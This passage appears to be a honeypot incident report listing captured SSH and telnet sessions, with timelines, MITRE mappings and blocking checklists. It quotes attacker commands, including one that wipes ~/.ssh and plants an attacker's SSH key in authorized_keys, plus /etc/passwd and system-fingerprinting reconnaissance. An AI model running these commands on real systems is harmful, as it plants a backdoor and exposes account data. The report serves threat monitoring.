| **Last Seen** | 2026-08-24 12:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:05:38` | `cowrie.session.connect` |
| `2026-08-24 12:05:38` | `cowrie.client.version` |
| `2026-08-24 12:05:38` | `cowrie.client.kex` |
| `2026-08-24 12:05:38` | `cowrie.login.success` |
| `2026-08-24 12:05:39` | `cowrie.session.params` |
| `2026-08-24 12:05:39` | `cowrie.command.input` |
| `2026-08-24 12:05:39` | `cowrie.command.failed` |
| `2026-08-24 12:05:39` | `cowrie.log.closed` |
| `2026-08-24 12:05:40` | `cowrie.session.params` |
| `2026-08-24 12:05:40` | `cowrie.command.input` |
| `2026-08-24 12:05:40` | `cowrie.session.file_download` |
| `2026-08-24 12:05:40` | `cowrie.log.closed` |
| `2026-08-24 12:05:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.34.222[.]174` to AbuseIPDB if not already reported
- [ ] Block `191.34.222[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27542b81c1ce

| Field | Detail |
|---|---|
| **Source IP** | `191.34.222[.]174` |
| **First Seen** | 2026-08-24 12:05 |
| **Last Seen** | 2026-08-24 12:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:05:40` | `cowrie.session.connect` |
| `2026-08-24 12:05:40` | `cowrie.client.version` |
| `2026-08-24 12:05:41` | `cowrie.client.kex` |
| `2026-08-24 12:05:41` | `cowrie.login.success` |
| `2026-08-24 12:05:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.34.222[.]174` to AbuseIPDB if not already reported
- [ ] Block `191.34.222[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-807f8dc537b9

| Field | Detail |
|---|---|
| **Source IP** | `191.34.222[.]174` |
| **First Seen** | 2026-08-24 12:05 |
| **Last Seen** | 2026-08-24 12:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:05:41` | `cowrie.session.connect` |
| `2026-08-24 12:05:41` | `cowrie.client.version` |
| `2026-08-24 12:05:42` | `cowrie.client.kex` |
| `2026-08-24 12:05:42` | `cowrie.login.success` |
| `2026-08-24 12:05:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.34.222[.]174` to AbuseIPDB if not already reported
- [ ] Block `191.34.222[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-909aacb904d8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:06 |
| **Last Seen** | 2026-08-24 12:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:06:18` | `cowrie.session.connect` |
| `2026-08-24 12:06:18` | `cowrie.client.version` |
| `2026-08-24 12:06:18` | `cowrie.client.kex` |
| `2026-08-24 12:06:20` | `cowrie.login.success` |
| `2026-08-24 12:06:21` | `cowrie.session.params` |
| `2026-08-24 12:06:21` | `cowrie.command.input` |
| `2026-08-24 12:06:21` | `cowrie.command.input` |
| `2026-08-24 12:06:21` | `cowrie.command.input` |
| `2026-08-24 12:06:21` | `cowrie.command.input` |
| `2026-08-24 12:06:21` | `cowrie.command.input` |
| `2026-08-24 12:06:21` | `cowrie.command.success` |
| `2026-08-24 12:06:21` | `cowrie.command.input` |
| `2026-08-24 12:06:21` | `cowrie.command.input` |
| `2026-08-24 12:06:21` | `cowrie.command.input` |
| `2026-08-24 12:06:21` | `cowrie.command.input` |
| `2026-08-24 12:06:22` | `cowrie.log.closed` |
| `2026-08-24 12:06:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-687ebe9838cc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:07 |
| **Last Seen** | 2026-08-24 12:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:07:51` | `cowrie.session.connect` |
| `2026-08-24 12:07:51` | `cowrie.client.version` |
| `2026-08-24 12:07:51` | `cowrie.client.kex` |
| `2026-08-24 12:07:54` | `cowrie.login.success` |
| `2026-08-24 12:07:55` | `cowrie.session.params` |
| `2026-08-24 12:07:55` | `cowrie.command.input` |
| `2026-08-24 12:07:55` | `cowrie.command.input` |
| `2026-08-24 12:07:55` | `cowrie.command.input` |
| `2026-08-24 12:07:55` | `cowrie.command.input` |
| `2026-08-24 12:07:55` | `cowrie.command.input` |
| `2026-08-24 12:07:55` | `cowrie.command.success` |
| `2026-08-24 12:07:55` | `cowrie.command.input` |
| `2026-08-24 12:07:55` | `cowrie.command.input` |
| `2026-08-24 12:07:55` | `cowrie.command.input` |
| `2026-08-24 12:07:55` | `cowrie.command.input` |
| `2026-08-24 12:07:55` | `cowrie.log.closed` |
| `2026-08-24 12:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-929fe35eced3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:09 |
| **Last Seen** | 2026-08-24 12:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:09:27` | `cowrie.session.connect` |
| `2026-08-24 12:09:27` | `cowrie.client.version` |
| `2026-08-24 12:09:27` | `cowrie.client.kex` |
| `2026-08-24 12:09:29` | `cowrie.login.success` |
| `2026-08-24 12:09:30` | `cowrie.session.params` |
| `2026-08-24 12:09:30` | `cowrie.command.input` |
| `2026-08-24 12:09:30` | `cowrie.command.input` |
| `2026-08-24 12:09:30` | `cowrie.command.input` |
| `2026-08-24 12:09:30` | `cowrie.command.input` |
| `2026-08-24 12:09:30` | `cowrie.command.input` |
| `2026-08-24 12:09:30` | `cowrie.command.success` |
| `2026-08-24 12:09:30` | `cowrie.command.input` |
| `2026-08-24 12:09:30` | `cowrie.command.input` |
| `2026-08-24 12:09:30` | `cowrie.command.input` |
| `2026-08-24 12:09:30` | `cowrie.command.input` |
| `2026-08-24 12:09:31` | `cowrie.log.closed` |
| `2026-08-24 12:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8017d21e0674

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:12 |
| **Last Seen** | 2026-08-24 12:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:12:43` | `cowrie.session.connect` |
| `2026-08-24 12:12:44` | `cowrie.client.version` |
| `2026-08-24 12:12:44` | `cowrie.client.kex` |
| `2026-08-24 12:12:46` | `cowrie.login.success` |
| `2026-08-24 12:12:47` | `cowrie.session.params` |
| `2026-08-24 12:12:47` | `cowrie.command.input` |
| `2026-08-24 12:12:47` | `cowrie.command.input` |
| `2026-08-24 12:12:47` | `cowrie.command.input` |
| `2026-08-24 12:12:47` | `cowrie.command.input` |
| `2026-08-24 12:12:47` | `cowrie.command.input` |
| `2026-08-24 12:12:47` | `cowrie.command.success` |
| `2026-08-24 12:12:47` | `cowrie.command.input` |
| `2026-08-24 12:12:47` | `cowrie.command.input` |
| `2026-08-24 12:12:47` | `cowrie.command.input` |
| `2026-08-24 12:12:47` | `cowrie.command.input` |
| `2026-08-24 12:12:48` | `cowrie.log.closed` |
| `2026-08-24 12:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfbfd124c9bc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 12:12 |
| **Last Seen** | 2026-08-24 12:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:12:57` | `cowrie.session.connect` |
| `2026-08-24 12:12:57` | `cowrie.client.version` |
| `2026-08-24 12:12:58` | `cowrie.client.kex` |
| `2026-08-24 12:12:58` | `cowrie.login.success` |
| `2026-08-24 12:12:59` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:12:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 12:12:59` | `cowrie.direct-tcpip.data` |
| `2026-08-24 12:12:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-621cf4627b29

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 12:13 |
| **Last Seen** | 2026-08-24 12:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:13:02` | `cowrie.session.connect` |
| `2026-08-24 12:13:02` | `cowrie.client.version` |
| `2026-08-24 12:13:02` | `cowrie.client.kex` |
| `2026-08-24 12:13:04` | `cowrie.login.success` |
| `2026-08-24 12:13:04` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:13:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 12:13:05` | `cowrie.direct-tcpip.data` |
| `2026-08-24 12:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0033e235e2d6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:14 |
| **Last Seen** | 2026-08-24 12:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:14:21` | `cowrie.session.connect` |
| `2026-08-24 12:14:21` | `cowrie.client.version` |
| `2026-08-24 12:14:21` | `cowrie.client.kex` |
| `2026-08-24 12:14:22` | `cowrie.login.success` |
| `2026-08-24 12:14:24` | `cowrie.session.params` |
| `2026-08-24 12:14:24` | `cowrie.command.input` |
| `2026-08-24 12:14:24` | `cowrie.command.input` |
| `2026-08-24 12:14:24` | `cowrie.command.input` |
| `2026-08-24 12:14:24` | `cowrie.command.input` |
| `2026-08-24 12:14:24` | `cowrie.command.input` |
| `2026-08-24 12:14:24` | `cowrie.command.success` |
| `2026-08-24 12:14:24` | `cowrie.command.input` |
| `2026-08-24 12:14:24` | `cowrie.command.input` |
| `2026-08-24 12:14:24` | `cowrie.command.input` |
| `2026-08-24 12:14:24` | `cowrie.command.input` |
| `2026-08-24 12:14:24` | `cowrie.log.closed` |
| `2026-08-24 12:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9515fe80ac0

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-24 12:15 |
| **Last Seen** | 2026-08-24 12:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:15:00` | `cowrie.session.connect` |
| `2026-08-24 12:15:00` | `cowrie.client.version` |
| `2026-08-24 12:15:00` | `cowrie.client.kex` |
| `2026-08-24 12:15:01` | `cowrie.login.success` |
| `2026-08-24 12:15:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47a8507aa983

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-24 12:15 |
| **Last Seen** | 2026-08-24 12:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:15:00` | `cowrie.session.connect` |
| `2026-08-24 12:15:00` | `cowrie.client.version` |
| `2026-08-24 12:15:00` | `cowrie.client.kex` |
| `2026-08-24 12:15:01` | `cowrie.login.success` |
| `2026-08-24 12:15:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1277b56a2450

| Field | Detail |
|---|---|
| **Source IP** | `223.123.92[.]56` |
| **First Seen** | 2026-08-24 12:15 |
| **Last Seen** | 2026-08-24 12:16 |
| **Session Duration** | 64s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:15:36` | `cowrie.session.connect` |
| `2026-08-24 12:15:37` | `cowrie.telnet.option` |
| `2026-08-24 12:15:37` | `cowrie.telnet.option` |
| `2026-08-24 12:15:37` | `cowrie.login.success` |
| `2026-08-24 12:15:38` | `cowrie.session.params` |
| `2026-08-24 12:15:39` | `cowrie.telnet.option` |
| `2026-08-24 12:15:39` | `cowrie.telnet.option` |
| `2026-08-24 12:15:39` | `cowrie.command.input` |
| `2026-08-24 12:15:39` | `cowrie.command.input` |
| `2026-08-24 12:15:39` | `cowrie.command.input` |
| `2026-08-24 12:15:39` | `cowrie.command.input` |
| `2026-08-24 12:15:39` | `cowrie.command.failed` |
| `2026-08-24 12:15:39` | `cowrie.command.input` |
| `2026-08-24 12:15:39` | `cowrie.command.failed` |
| `2026-08-24 12:15:39` | `cowrie.command.input` |
| `2026-08-24 12:15:39` | `cowrie.command.failed` |
| `2026-08-24 12:15:39` | `cowrie.command.input` |
| `2026-08-24 12:15:39` | `cowrie.command.input` |
| `2026-08-24 12:15:39` | `cowrie.command.input` |
| `2026-08-24 12:15:39` | `cowrie.command.input` |
| `2026-08-24 12:15:39` | `cowrie.command.failed` |
| `2026-08-24 12:15:39` | `cowrie.command.input` |
| `2026-08-24 12:15:39` | `cowrie.command.failed` |
| `2026-08-24 12:15:39` | `cowrie.command.input` |
| `2026-08-24 12:15:39` | `cowrie.command.failed` |
| `2026-08-24 12:15:39` | `cowrie.command.input` |
| `2026-08-24 12:15:39` | `cowrie.command.failed` |
| `2026-08-24 12:15:39` | `cowrie.command.input` |
| `2026-08-24 12:15:39` | `cowrie.command.input` |
| `2026-08-24 12:15:39` | `cowrie.command.failed` |
| `2026-08-24 12:15:39` | `cowrie.command.input` |
| `2026-08-24 12:15:39` | `cowrie.command.input` |
| `2026-08-24 12:16:40` | `cowrie.log.closed` |
| `2026-08-24 12:16:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.123.92[.]56` to AbuseIPDB if not already reported
- [ ] Block `223.123.92[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c9af7ef9329

| Field | Detail |
|---|---|
| **Source IP** | `182.95.18[.]90` |
| **First Seen** | 2026-08-24 12:15 |
| **Last Seen** | 2026-08-24 12:16 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:15:51` | `cowrie.session.connect` |
| `2026-08-24 12:15:52` | `cowrie.client.version` |
| `2026-08-24 12:15:53` | `cowrie.client.kex` |
| `2026-08-24 12:15:55` | `cowrie.login.success` |
| `2026-08-24 12:15:56` | `cowrie.direct-tcpip.request` |
| `2026-08-24 12:16:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.95.18[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.95.18[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42e830d7b5ad

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:16 |
| **Last Seen** | 2026-08-24 12:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:16:02` | `cowrie.session.connect` |
| `2026-08-24 12:16:03` | `cowrie.client.version` |
| `2026-08-24 12:16:03` | `cowrie.client.kex` |
| `2026-08-24 12:16:04` | `cowrie.login.success` |
| `2026-08-24 12:16:06` | `cowrie.session.params` |
| `2026-08-24 12:16:06` | `cowrie.command.input` |
| `2026-08-24 12:16:06` | `cowrie.command.input` |
| `2026-08-24 12:16:06` | `cowrie.command.input` |
| `2026-08-24 12:16:06` | `cowrie.command.input` |
| `2026-08-24 12:16:06` | `cowrie.command.input` |
| `2026-08-24 12:16:06` | `cowrie.command.success` |
| `2026-08-24 12:16:06` | `cowrie.command.input` |
| `2026-08-24 12:16:06` | `cowrie.command.input` |
| `2026-08-24 12:16:06` | `cowrie.command.input` |
| `2026-08-24 12:16:06` | `cowrie.command.input` |
| `2026-08-24 12:16:06` | `cowrie.log.closed` |
| `2026-08-24 12:16:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-703d0c40c6c6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-24 12:17 |
| **Last Seen** | 2026-08-24 12:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 12:17:48` | `cowrie.session.connect` |
| `2026-08-24 12:17:49` | `cowrie.client.version` |
| `2026-08-24 12:17:49` | `cowrie.client.kex` |
| `2026-08-24 12:17:51` | `cowrie.login.success` |
| `2026-08-24 12:17:52` | `cowrie.session.params` |
| `2026-08-24 12:17:52` | `cowrie.command.input` |
| `2026-08-24 12:17:52` | `cowrie.command.input` |
| `2026-08-24 12:17:52` | `cowrie.command.input` |
| `2026-08-24 12:17:52` | `cowrie.command.input` |
| `2026-08-24 12:17:52` | `cowrie.command.input` |
| `2026-08-24 12:17:52` | `cowrie.command.success` |
| `2026-08-24 12:17:52` | `cowrie.command.input` |
| `2026-08-24 12:17:52` | `cowrie.command.input` |
| `2026-08-24 12:17:52` | `cowrie.command.input` |
| `2026-08-24 12:17:52` | `cowrie.command.input` |
| `2026-08-24 12:17:53` | `cowrie.log.closed` |
| `2026-08-24 12:17:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

